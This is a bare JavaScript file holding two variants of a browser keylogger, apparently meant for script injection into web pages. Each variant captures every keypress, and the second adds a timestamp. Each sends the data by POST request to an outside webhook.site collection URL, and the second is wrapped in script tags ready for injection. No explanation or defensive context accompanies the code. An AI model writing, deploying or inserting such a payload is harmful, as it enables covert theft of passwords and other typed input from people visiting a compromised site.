
document.onkeypress = function (evt) {
	evt = evt || window.event
	key = String.fromCharCode(evt.charCode)
    if (key) {
    	var http = new XMLHttpRequest();
    	var param = encodeURI(key)
    	http.open("POST", "https://webhook.site/fcf8ebce-5222-4130-a059-cf735f83ec16", true);   	http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    	http.send("key="+param);
	}
}



//     time = new Date().getTime()
<script>
document.onkeypress = function (evt) {
	evt = evt || window.event
	key = String.fromCharCode(evt.charCode)
    var time = new Date().getTime()
	if (key) {
    	var http = new XMLHttpRequest();
    	var param = encodeURI(key)
        var paramtime = encodeURI(time)
    	http.open("POST", "https://webhook.site/27dbe40a-4dc8-404f-a62e-72a4e31ba718", true);   	http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    	http.send("key="+param + "&time=" + paramtime);
	}
}
</script>